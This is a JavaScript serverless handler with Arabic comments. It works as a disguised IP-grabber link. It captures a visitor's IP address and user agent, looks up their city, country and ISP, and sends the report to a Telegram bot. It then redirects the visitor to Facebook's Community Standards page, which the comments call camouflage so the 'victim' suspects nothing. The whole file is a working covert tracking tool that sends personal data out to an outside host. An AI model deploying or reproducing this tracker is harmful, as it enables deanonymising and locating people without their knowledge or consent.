const axios = require('axios');

export default async function handler(req, res) {
    const { BOT_TOKEN, CHAT_ID } = process.env;

    // 1. جلب عنوان الـ IP الحقيقي للزائر
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    try {
        // 2. استعلام OSINT عن الموقع الجغرافي للـ IP
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,zip,isp,org,as,query`);
        const geo = geoResponse.data;

        // 3. تنسيق التقرير بشكل احترافي
        const report = `
🔍 **[ NEW OSINT ALERT ]** 🔍
━━━━━━━━━━━━━━━━━━
🌐 **Network Details:**
• **IP:** \`${ip}\`
• **Country:** ${geo.country || 'Unknown'} 🇪🇬
• **City:** ${geo.city || 'Unknown'}
• **ISP:** \`${geo.isp || 'Unknown'}\`

📱 **Device Info:**
• **System:** \`${userAgent.split('(')[1]?.split(')')[0] || 'Unknown'}\`
• **Agent:** \`Browser Detected\`

🕒 **Time:** \`${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\`
━━━━━━━━━━━━━━━━━━
📡 *Cyber Research Dashboard v2.0*
        `;

        // 4. إرسال التقرير لتليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: report,
            parse_mode: 'Markdown'
        });

        // 5. التمويه: توجيه الضحية لصفحة حقيقية (Community Standards)
        return res.redirect(301, 'https://www.facebook.com/communitystandards/');

    } catch (error) {
        console.error('Error in Tracking:', error);
        // في حالة الفشل، التوجه لفيسبوك أيضاً لعدم إثارة الشكوك
        return res.redirect(301, 'https://www.facebook.com');
    }
}
